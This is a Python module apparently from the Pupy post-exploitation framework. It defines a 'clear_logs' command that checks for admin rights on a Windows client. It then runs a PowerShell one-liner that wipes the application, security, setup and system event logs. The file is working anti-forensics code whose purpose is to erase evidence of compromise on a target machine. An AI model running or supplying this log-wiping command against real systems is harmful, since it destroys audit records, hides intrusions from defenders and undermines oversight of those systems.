# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from modules.lib.utils.shell_exec import shell_exec

__class_name__="ClearLogs"

@config(cat="admin", compat=["windows"])
class ClearLogs(PupyModule):
    """ clear event logs """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="clear_logs", description=self.__doc__)

    def run(self, args):
        if self.client.desc['intgty_lvl'] != "High":
            self.error('You need admin privileges to clear logs')
            return 
        
        powershell_cmd = '$events_logs="application","security","setup","system"; ForEach ($event in $events_logs) { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("$event")}'
        output = shell_exec(self.client, powershell_cmd, shell='powershell.exe')
        if not output:
            self.success('Logs deleted successfully')
        else:
            self.error('An error occured: \n%s' % output)